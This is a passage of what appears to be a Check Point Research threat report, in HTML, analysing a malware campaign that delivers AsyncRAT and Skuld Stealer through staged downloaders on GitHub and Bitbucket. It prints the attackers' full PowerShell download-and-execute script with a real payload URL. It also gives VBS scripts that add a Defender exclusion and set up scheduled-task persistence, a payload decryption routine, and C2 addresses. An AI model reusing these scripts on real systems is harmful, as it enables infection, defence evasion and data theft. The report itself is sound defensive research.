+&lt;p&gt;At the conclusion of this phase, a PowerShell script is executed on the victim’s machine. This script downloads and runs a first-stage downloader (&lt;strong&gt;installer.exe&lt;/strong&gt;) from GitHub, initiating the next phase of the attack.&lt;/p&gt;
+
+
+
+&lt;p&gt;The script executed at the end of this phase downloads and runs a first-stage downloader (&lt;strong&gt;installer.exe&lt;/strong&gt;) from GitHub, initiating the next stage of the attack. This stage involves multiple loaders and payloads retrieved from Bitbucket, ultimately deploying malicious payloads, including AsyncRAT and Skuld Stealer:&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31488" height="588" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-11-Infection-chain-overview-From-PowerShell-to-final-malware-payload-delivery-1024x588.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 11&lt;/strong&gt; &amp;#8211; Infection chain overview: From PowerShell to final malware payload delivery.&lt;/p&gt;
+
+
+
+&lt;p&gt;Let’s now examine each component of the second-phase in detail.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;Downloader PowerShell Script&lt;/h2&gt;
+
+
+
+&lt;p&gt;The script download from Pastebin link is not obfuscated or encrypted.&amp;nbsp;From its code we can see that it downloads and runs an executable file from a GitHub URL:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;# Hide PowerShell Console Window
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+}
+"@
+$consolePtr = [Win32]::GetConsoleWindow()
+[Win32]::ShowWindow($consolePtr, 0)  # Hide the console window
+
+# Define the download and execution parameters
+$url = "https://github.com/frfs1/update/raw/refs/heads/main/installer.exe"  # Direct EXE download
+$exePath = Join-Path $env:TEMP ('installer.exe')
+
+try {
+    Write-Output "Establishing connection..."
+
+    # Download the EXE using WebClient
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($url, $exePath)
+
+    # Validate the download
+    if (-not (Test-Path $exePath) -or ((Get-Item $exePath).length -eq 0)) {
+        Write-Output "failed. Exiting..."
+        exit 1
+    }
+
+    # Run the executable
+	Start-Process -FilePath $exePath -ArgumentList "-arg1" -NoNewWindow
+
+} catch {
+    Write-Output "An error occurred"
+} finally {
+    Write-Output "unable to detect discord session."
+}
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;We noticed that almost no anti-virus vendors flag this script as malicious:&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31487" height="148" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-12-Malicious-PowerShell-script-has-an-extremely-low-detection-rate-on-VirusTotal-1024x148.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 12&lt;/strong&gt; &amp;#8211; Malicious PowerShell script has an extremely low detection rate on VirusTotal.&lt;/p&gt;
+
+
+
+&lt;p&gt;Cybercriminals actively use the ability to edit information posted on Pastebin to change the GitHub URL from which the executable file is downloaded.&amp;nbsp;This probably allows them to bypass the blocking by GitHub.&amp;nbsp;If the repository is deleted,&amp;nbsp;the attackers just create a new account and&amp;nbsp;a new repository,&amp;nbsp;to which they upload the file.&amp;nbsp;The new URL is then placed inside the Pastebin script.&lt;/p&gt;
+
+
+
+&lt;p&gt;While monitoring the campaign,&amp;nbsp;we observed the following changes in the address:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;&lt;strong&gt;https://github[.]com/frfs1/update/raw/refs/heads/main/installer.exe&lt;/strong&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;https://github[.]com/shisuh/update/raw/refs/heads/main/installer.exe&lt;/strong&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;https://github[.]com/gkwdw/wffaw/raw/refs/heads/main/installer.exe&lt;/strong&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;https://codeberg[.]org/wfawwf/dwadwaa/raw/branch/main/installer.exe&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;First Stage Downloader: installer.exe&lt;/h2&gt;
+
+
+
+&lt;p&gt;The downloaded executable&amp;nbsp;&lt;strong&gt;installer.exe&lt;/strong&gt;&amp;nbsp; (SHA256:&amp;nbsp;&lt;strong&gt;673090abada8ca47419a5dbc37c5443fe990973613981ce622f30e83683dc932&lt;/strong&gt;)&amp;nbsp;has extremely low detection rates.&amp;nbsp;At the time of our research,&amp;nbsp;only a single antivirus vendor on VirusTotal flagged it as malicious:&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31489" height="145" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-13-First-Stage-Downloader-has-an-extremely-low-detection-rate-on-VirusTotal-1024x145.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 13&lt;/strong&gt; &amp;#8211; First Stage Downloader has an extremely low detection rate on VirusTotal.&lt;/p&gt;
+
+
+
+&lt;p&gt;During continued monitoring of the campaign,&amp;nbsp;we identified a newer variant of the loader&amp;nbsp;(SHA256:&amp;nbsp;&lt;strong&gt;160eda7ad14610d93f28b7dee20501028c1a9d4f5dc0437794ccfc2604807693&lt;/strong&gt;)&amp;nbsp;that achieved zero detections across all antivirus engines at the time of submission.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31490" height="144" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-14-First-Stage-Downloader-with-zero-detections-on-VirusTotal-1024x144.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 14&lt;/strong&gt; &amp;#8211; First Stage Downloader with zero detections on VirusTotal.&lt;/p&gt;
+
+
+
+&lt;p&gt;This binary acts as a downloader that retrieves its second-stage payloads from remote servers.&lt;/p&gt;
+
+
+
+&lt;p&gt;Written in C++&amp;nbsp;and approximately 4.8MB in size,&amp;nbsp;the binary is not packed.&amp;nbsp;However,&amp;nbsp;the extensive use of junk code complicates its static analysis.&amp;nbsp;Additionally,&amp;nbsp;C++&amp;nbsp;binaries inherently complicate analysis due to their use of virtual function tables,&amp;nbsp;indirect function calls,&amp;nbsp;and complex runtime structures,&amp;nbsp;making it challenging to quickly identify the relevant code paths.&lt;/p&gt;
+
+
+
+&lt;p&gt;At first glance,&amp;nbsp;the downloader seems to contain plaintext strings;&amp;nbsp;however,&amp;nbsp;nearly all easily visible strings belong to junk code designed to distract analysts.&amp;nbsp;In reality,&amp;nbsp;critical strings related to malicious functionality are concealed by being stored as sequences of immediate values pushed directly onto the stack at runtime.&amp;nbsp;Each string is additionally encrypted using a simple XOR cipher with a single-byte key.&amp;nbsp;A distinct XOR key is used for every encrypted string and loaded into the&amp;nbsp;&lt;code&gt;CL&lt;/code&gt;&amp;nbsp;register typically just before the process of writing encrypted bytes to the stack.&amp;nbsp;The same method is applied to obfuscate important Windows API function names,&amp;nbsp;whose addresses the malware dynamically resolves using&amp;nbsp;&lt;code&gt;GetProcAddress&lt;/code&gt;.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31491" height="443" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-15-Strings-and-API-calls-obfuscation-in-the-loader.png" width="886" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 15&lt;/strong&gt; &amp;#8211; Strings and API calls obfuscation in the loader.&lt;/p&gt;
+
+
+
+&lt;p&gt;When executed in a sandbox without extra options,&amp;nbsp;the malware does not expose any suspicious functionality.&amp;nbsp;It just performs dozens of junk calls&amp;nbsp;(such as&amp;nbsp;&lt;code&gt;OpenThemeData&lt;/code&gt;,&amp;nbsp;&lt;code&gt;RegisterWindowMessageW&lt;/code&gt;,&amp;nbsp;&lt;code&gt;SHGetStockIconInf&lt;/code&gt;,&amp;nbsp;etc.)&amp;nbsp;and then exits.&lt;/p&gt;
+
+
+
+&lt;p&gt;However,&amp;nbsp;if executed with the command-line parameters&amp;nbsp;”&lt;code&gt;-arg1&lt;/code&gt;&amp;#8221;&amp;nbsp;or&amp;nbsp;”&lt;code&gt;-arg2&lt;/code&gt;&amp;#8220;,&amp;nbsp;it initiates further malicious operations.&amp;nbsp;It&amp;#8217;s noteworthy that the initial PowerShell script described earlier explicitly passes the “&amp;nbsp;&lt;code&gt;-arg1&lt;/code&gt;&amp;#8221;&amp;nbsp;parameter to the executable,&amp;nbsp;triggering its malicious functionality.&lt;/p&gt;
+
+
+
+&lt;p&gt;Upon execution with the correct argument,&amp;nbsp;the dropper creates the following directory: &lt;code&gt;C:\\Users\\%USERNAME%\\AppData\\Local\\ServiceHelper\\&lt;/code&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;Then,&amp;nbsp;it creates two Visual Basic scripts inside this folder:&lt;/p&gt;
+
+
+
+&lt;ol class="wp-block-list"&gt;
+&lt;li&gt;&lt;strong&gt;nat1.vbs&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+
+
+&lt;p&gt;This script attempts to evade Windows Defender detection by adding the user&amp;#8217;s directory to Defender&amp;#8217;s exclusion paths.&amp;nbsp;It also schedules a persistent task named&amp;nbsp;&lt;code&gt;checker&lt;/code&gt;,&amp;nbsp;set to run every 5 minutes with the highest privileges.&amp;nbsp;This task periodically launches the second script,&amp;nbsp;&lt;strong&gt;runsys.vbs&lt;/strong&gt;.&amp;nbsp;In addition,&amp;nbsp;the script ensures the creation of a placeholder file&amp;nbsp;called &lt;strong&gt;settings.txt&lt;/strong&gt;.&amp;nbsp;This file acts as an execution flag:&amp;nbsp;The malware checks for its existence upon startup to determine if it has previously run.&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;Dim objNetwork, strUsername, objShellApp, objShell, strExclusionPath, strTaskCommand
+Set objNetwork = CreateObject("WScript.Network")
+strUsername = objNetwork.UserName
+Set objShellApp = CreateObject("Shell.Application")
+Set objShell = CreateObject("WScript.Shell")
+strExclusionPath = "C:\\users\\" &amp;amp; strUsername
+objShellApp.ShellExecute "PowerShell", "-Command Add-MpPreference -ExclusionPath '" &amp;amp; strExclusionPath &amp;amp; "'", "", "runas", 0
+strTaskCommand = "schtasks /create /tn ""checker"" /tr ""wscript.exe \\""C:\\Users\\" &amp;amp; strUsername &amp;amp; "\\AppData\\Local\\ServiceHelper\\runsys.vbs\\"""" /sc MINUTE /mo 5 /RL HIGHEST"
+objShell.Run "cmd /c " &amp;amp; strTaskCommand, 0, True
+strFilePath = "C:\\users\\" &amp;amp; strUsername &amp;amp; "\\AppData\\Local\\ServiceHelper\\settings.txt"
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+If Not objFSO.FileExists(strFilePath) Then
+    Call objFSO.CreateTextFile(strFilePath, True)
+End If
+Set objShellApp = Nothing
+Set objShell = Nothing
+Set objNetwork = Nothing
+Set objFSO = Nothing
+&lt;/pre&gt;
+
+
+
+&lt;ol class="wp-block-list"&gt;
+&lt;li&gt;&lt;strong&gt;runsys.vbs&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+
+
+&lt;p&gt;This short script silently executes the second-stage payload executable&amp;nbsp;&lt;strong&gt;syshelpers.exe&lt;/strong&gt;.&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;On Error Resume Next
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run """C:\\Users\\%UserName%\\AppData\\Local\\ServiceHelper\\syshelpers.exe""", 0, False
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;Once these scripts are set up,&amp;nbsp;the dropper proceeds to download two encrypted payloads from Bitbucket:&lt;/p&gt;
+
+
+
+&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;URL&lt;/th&gt;&lt;th&gt;Local file name&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;https://bitbucket[.]org/syscontrol6/syscontrol/downloads/skul.exe&lt;/td&gt;&lt;td&gt;searchHost.exe&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;https://bitbucket[.]org/syscontrol6/syscontrol/downloads/Rnr.exe&lt;/td&gt;&lt;td&gt;syshelpers.exe&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;p&gt;To perform HTTP requests, the malware uses the following specific User-agent string:&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;code&gt;Dynamic WinHTTP Client/1.0&lt;/code&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;Both files are stored encrypted on the Bitbucket service.&amp;nbsp;To decrypt these downloaded executables,&amp;nbsp;the malware applies the following XOR-based algorithm:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;def decrypt_data(data):
+    return bytes(b ^ ((119 + 5 * i) &amp;amp; 0xFF) for i, b in enumerate(data))
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;Despite using a relatively simple encryption scheme,&amp;nbsp;this technique effectively prevents detection of the malicious payloads stored on Bitbucket.&amp;nbsp;At the time of this writing,&amp;nbsp;neither of the two downloaded files&amp;nbsp;(&lt;strong&gt;skul.exe&lt;/strong&gt;&amp;nbsp;and&amp;nbsp;&lt;strong&gt;Rnr.exe&lt;/strong&gt;)&amp;nbsp;is flagged as malicious by any antivirus vendor on VirusTotal.&amp;nbsp;Previously,&amp;nbsp;we observed similar use of payload encryption by malware such as GuLoader,&amp;nbsp;enabling threat actors to leverage legitimate services like Google Drive for payload hosting and&amp;nbsp;effectively evade antivirus detection.&lt;/p&gt;
+
+
+
+&lt;p&gt;Upon successful decryption,&amp;nbsp;these files are stored in the previously created directory&amp;nbsp;(&lt;strong&gt;ServiceHelper&lt;/strong&gt;).&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;The first downloaded file&amp;nbsp;&lt;strong&gt;searchHost.exe&lt;/strong&gt;&amp;nbsp;(initially&amp;nbsp;&lt;strong&gt;skul.exe&lt;/strong&gt;) is executed immediately by calling the&amp;nbsp;&lt;code&gt;CreateProcessW&lt;/code&gt;&amp;nbsp;API function.&lt;/li&gt;
+
+
+
+&lt;li&gt;The second file&amp;nbsp;&lt;strong&gt;syshelpers.exe&lt;/strong&gt;&amp;nbsp;(initially&amp;nbsp;&lt;strong&gt;Rnr.exe&lt;/strong&gt;) is executed every five minutes by the previously scheduled task (&lt;strong&gt;runsys.vbs&lt;/strong&gt;), thus ensuring long-term persistence on the victim’s machine.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;Second Stage Downloader: Rnr.exe&lt;/h2&gt;
+
+
+
+&lt;p&gt;The file&amp;nbsp;&lt;strong&gt;Rnr.exe&lt;/strong&gt;&amp;nbsp;(decrypted SHA256:&amp;nbsp;&lt;strong&gt;5d0509f68a9b7c415a726be75a078180e3f02e59866f193b0a99eee8e39c874f&lt;/strong&gt;),&amp;nbsp;downloaded from Bitbucket and saved locally as&amp;nbsp;&lt;strong&gt;syshelpers.exe&lt;/strong&gt;,&amp;nbsp;also acts as a downloader.&lt;/p&gt;
+
+
+
+&lt;p&gt;It shares many similarities with the previously described downloader&amp;nbsp;(&lt;strong&gt;installer.exe&lt;/strong&gt;), in particular that&amp;nbsp;both use XOR obfuscation with a single-byte key to hide strings and API function names.&lt;/p&gt;
+
+
+
+&lt;p&gt;When sending HTTP requests to download its payload,&amp;nbsp;the sample sets the following&amp;nbsp;&lt;code&gt;User-Agent&lt;/code&gt;&amp;nbsp;header:&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;code&gt;Dynamic WinHTTP Client/1.0&lt;/code&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;The encrypted payload is downloaded from this URL:&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;https://bitbucket[.]org/updatevak/upd/downloads/AClient.exe&lt;/strong&gt;&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31492" height="793" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-16-Encrypted-paths-and-a-URL-in-the-second-stage-downloader.png" width="814" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 16&lt;/strong&gt; &amp;#8211; Encrypted paths and a URL in the second stage downloader.&lt;/p&gt;
+
+
+
+&lt;p&gt;The same file can also be found on the previously discussed repository:&amp;nbsp;&lt;code&gt;https://bitbucket[.]org/syscontrol6/syscontrol/downloads/AClient.exe&lt;/code&gt;.&amp;nbsp;This may indicate that there could be other versions of the&amp;nbsp;&lt;strong&gt;Rnr.exe&lt;/strong&gt;&amp;nbsp;file downloading payloads from different repositories.&lt;/p&gt;
+
+
+
+&lt;p&gt;This downloader employs an interesting sandbox evasion technique.&amp;nbsp;On first execution,&amp;nbsp;the downloader fetches the payload from the above URL and saves it in the current directory under the name&amp;nbsp;”&lt;strong&gt;updatelog&lt;/strong&gt;”&amp;nbsp;(Note:&amp;nbsp;There is no file extension).&amp;nbsp;It then immediately exits without decrypting or executing the payload.&lt;/p&gt;
+
+
+
+&lt;p&gt;However,&amp;nbsp;as described earlier,&amp;nbsp;this executable is automatically re-executed every five minutes via a scheduled task&amp;nbsp;(&lt;strong&gt;runsys.vbs&lt;/strong&gt;).&amp;nbsp;On the next launch,&amp;nbsp;the downloader checks for the presence of the&amp;nbsp;”&lt;strong&gt;updatelog&lt;/strong&gt;”&amp;nbsp;file.&amp;nbsp;If the file exists,&amp;nbsp;the downloader proceeds to decrypt it using the same XOR-based algorithm used by the previous downloader and saves the result as&amp;nbsp;&lt;strong&gt;syshelp.exe&lt;/strong&gt;&amp;nbsp;in the same directory.&lt;/p&gt;
+
+
+
+&lt;p&gt;On every subsequent run,&amp;nbsp;the downloader checks if the file&amp;nbsp;&lt;strong&gt;syshelp.exe&lt;/strong&gt;&amp;nbsp;exists in the current folder,&amp;nbsp;and if so,&amp;nbsp;the downloader executes it.&lt;/p&gt;
+
+
+
+&lt;p&gt;Even when the full infection chain is triggered starting from the initial PowerShell script,&amp;nbsp;the malware’s use of scheduled tasks causes significant delays:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;Five minutes before the first download,&lt;/li&gt;
+
+
+
+&lt;li&gt;Another 5 minutes before decryption,&lt;/li&gt;
+
+
+
+&lt;li&gt;A final 5-minute delay before execution.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;In total,&amp;nbsp;at least 15 minutes must pass before any malicious behavior becomes visible&amp;nbsp;—&amp;nbsp;long enough to evade detection by many automated sandbox systems.&lt;/p&gt;
+
+
+
+&lt;p&gt;If this downloader is executed without prior context inside a sandbox, the final payload will be downloaded but never decrypted or run.&amp;nbsp;As a result,&amp;nbsp;none of its malicious behavior will be visible,&amp;nbsp;regardless of what the payload contains.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;Payload 1: AClient.exe (AsyncRAT)&lt;/h2&gt;
+
+
+
+&lt;p&gt;The first payload delivered in this campaign,&amp;nbsp;&lt;strong&gt;AClient.exe&lt;/strong&gt;&amp;nbsp;(decrypted SHA256:&amp;nbsp;&lt;strong&gt;53b65b7c38e3d3fca465c547a8c1acc53c8723877c6884f8c3495ff8ccc94fbe&lt;/strong&gt;),&amp;nbsp;is a variant of the AsyncRAT malware,&amp;nbsp;version 0.5.8.&amp;nbsp;AsyncRAT an open-source Remote Access Trojan&amp;nbsp;(RAT).&amp;nbsp;It provides attackers with comprehensive remote control capabilities over infected systems,&amp;nbsp;including:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;Executing arbitrary commands and scripts.&lt;/li&gt;
+
+
+
+&lt;li&gt;Keylogging and screen capturing.&lt;/li&gt;
+
+
+
+&lt;li&gt;File management (uploading, downloading, deleting files).&lt;/li&gt;
+
+
+
+&lt;li&gt;Remote desktop and camera access.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;This AsyncRAT sample uses a&amp;nbsp;&amp;#8220;dead drop resolver&amp;#8221;&amp;nbsp;technique:&amp;nbsp;Instead of directly embedding the command-and-control&amp;nbsp;(C&amp;amp;C)&amp;nbsp;server address,&amp;nbsp;the malware retrieves it from a publicly accessible third-party resource&amp;nbsp;&amp;#8211;&amp;nbsp;in this case,&amp;nbsp;a Pastebin document:&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;https://pastebin.com/raw/ftknPNF7&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;At the time of analysis,&amp;nbsp;the Pastebin URL contained the following C&amp;amp;C server address:&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;101.99.76.120:7707&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;However,&amp;nbsp;we later discovered that most of the time the address value was set to&amp;nbsp;&lt;code&gt;0.0.0.0:7707&lt;/code&gt;.&lt;/p&gt;
+
+
+
+&lt;p&gt;We also found earlier AsyncRAT samples related to the same threat actors with the following SHA256:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;&lt;strong&gt;d54fa589708546eca500fbeea44363443b86f2617c15c8f7603ff4fb05d494c1&lt;/strong&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;670be5b8c7fcd6e2920a4929fcaa380b1b0750bfa27336991a483c0c0221236a&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;The earliest sample was first seen on November 11, 2024.&amp;nbsp;These samples contain embedded C&amp;amp;C server addresses in their configuration:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;87.120.127.37:7707
+185.234.247.8:7707
+microads[.]top:7707
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;The registration date for the domain&amp;nbsp;&lt;code&gt;microads[.]top&lt;/code&gt;&amp;nbsp;is August 15, 2024, meaning that the threat actors are active at least from this date.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;Payload 2: skul.exe (Skuld Stealer)&lt;/h2&gt;
+
+
+
+&lt;p&gt;The second payload downloaded from Bitbucket is&amp;nbsp;&lt;strong&gt;skul.exe&lt;/strong&gt;&amp;nbsp;(decrypted SHA256:&amp;nbsp;&lt;strong&gt;8135f126764592be3df17200f49140bfb546ec1b2c34a153aa509465406cb46c&lt;/strong&gt;).&amp;nbsp;This executable is identified as a variant of the&amp;nbsp;&lt;strong&gt;Skuld Stealer&lt;/strong&gt;,&amp;nbsp;a malware tool written in Go and publicly available as open source on GitHub.&lt;/p&gt;
+
+
+
+&lt;p&gt;The original Skuld Stealer project is described as a proof-of-concept malware targeting Windows systems,&amp;nbsp;designed to steal sensitive user data from multiple sources,&amp;nbsp;including Discord,&amp;nbsp;various browsers,&amp;nbsp;crypto wallets,&amp;nbsp;and gaming platforms.&lt;/p&gt;
+
+
+
+&lt;p&gt;The original Skuld Stealer provides extensive functionality,&amp;nbsp;including:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;Anti-debugging (termination of debugging tools).&lt;/li&gt;
+
+
+
+&lt;li&gt;Virtual machine detection and sandbox evasion.&lt;/li&gt;
+
+
+
+&lt;li&gt;Credential theft from Chromium-based and Gecko-based browsers (logins, cookies, credit cards, browser history).&lt;/li&gt;
+
+
+
+&lt;li&gt;Crypto clipper (replaces clipboard contents with attacker-controlled cryptocurrency addresses).&lt;/li&gt;
+
+
+
+&lt;li&gt;Stealing Discord authentication tokens.&lt;/li&gt;
+
+
+
+&lt;li&gt;Discord injection module to intercept sensitive user operations such as login, password changes, payment information additions, preventing requests to view devices, and blocking QR logins.&lt;/li&gt;
+
+
+
+&lt;li&gt;Collecting sessions from popular gaming platforms (Epic Games, Minecraft, Riot Games, Uplay).&lt;/li&gt;
+
+
+
+&lt;li&gt;System information gathering (CPU, GPU, RAM, IP, geolocation, Wi-Fi networks).&lt;/li&gt;
+
+
+
+&lt;li&gt;Crypto wallet data theft, including mnemonic phrases and passwords.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;However,&amp;nbsp;the variant used in this specific campaign differs from the publicly available version in several aspects.&amp;nbsp;Notably,&amp;nbsp;it omits certain functionality:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;No crypto clipper.&lt;/li&gt;
+
+
+
+&lt;li&gt;No anti-debugging measures.&lt;/li&gt;
+
+
+
+&lt;li&gt;No stealing sessions from gaming platforms.&lt;/li&gt;
+
+
+
+&lt;li&gt;No built-in persistence mechanism: Unlike the public version, this stealer does not implement internal persistence. Instead, persistence is externally achieved through the previously described scheduled task (&lt;strong&gt;runsys.vbs&lt;/strong&gt;).&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;Let’s go deeper into some of the details of the variant used in this campaign.&lt;/p&gt;
+
+
+
+&lt;h3 class="wp-block-heading"&gt;Mutex Usage&lt;/h3&gt;
+
+
+
+&lt;p&gt;To prevent multiple instances of itself from running,&amp;nbsp;Skuld creates a mutex with a specific,&amp;nbsp;GUID-like name.&amp;nbsp;The variant used in this campaign uses the exact same mutex name as the open-source version:&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;code&gt;3575651c-bb47-448e-a514-22865732bbc&lt;/code&gt;&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;func IsAlreadyRunning() bool {
+	const AppID = "3575651c-bb47-448e-a514-22865732bbc"
+
+	_, err := windows.CreateMutex(nil, false, syscall.StringToUTF16Ptr(fmt.Sprintf("Global\\\\%s", AppID)))
+	return err != nil
+}
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;This mutex name can be used as an IOC to detect if Skuld is active in the system.&lt;/p&gt;
+
+
+
+&lt;h3 class="wp-block-heading"&gt;Data Exfiltration via Discord Webhooks&lt;/h3&gt;
+
+
+
+&lt;p&gt;Skuld sends the collected data through a&amp;nbsp;&lt;strong&gt;Discord webhook&lt;/strong&gt;,&amp;nbsp;a one-way HTTP-based channel commonly used by applications to post automated messages and data to Discord channels.&amp;nbsp;Webhooks provide a convenient,&amp;nbsp;secure,&amp;nbsp;and easily configurable way for attackers to exfiltrate stolen information without maintaining complex command-and-control servers.&lt;/p&gt;
+
+
+
+&lt;p&gt;In the original open-source version of Skuld,&amp;nbsp;the Discord webhook URL is stored in plaintext within the configuration:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;CONFIG := map[string]interface{}{
+	"webhook": "https://discord.com/api/webhooks/...",
+	"cryptos": map[string]string{
+		"BTC":  "",  # crypto-clipper setup
+		"BCH":  "",
+		// ...
+	},
+}
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;However,&amp;nbsp;the variant analyzed in this campaign uses two separate Discord webhooks,&amp;nbsp;each serving different purposes,&amp;nbsp;and both URLs are encrypted using a single-byte XOR cipher.&lt;/p&gt;
+
+
+
+&lt;p&gt;Upon execution,&amp;nbsp;the malware decrypts both webhook URLs:&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31493" height="360" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-17-Webhook-URL-decryption-in-Skuld-stealer.png" width="660" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 17&lt;/strong&gt; &amp;#8211; Webhook URL decryption in Skuld stealer.&lt;/p&gt;
+
+
+
+&lt;p&gt;These are the decrypted webhook URLs:&lt;/p&gt;
+
+
+
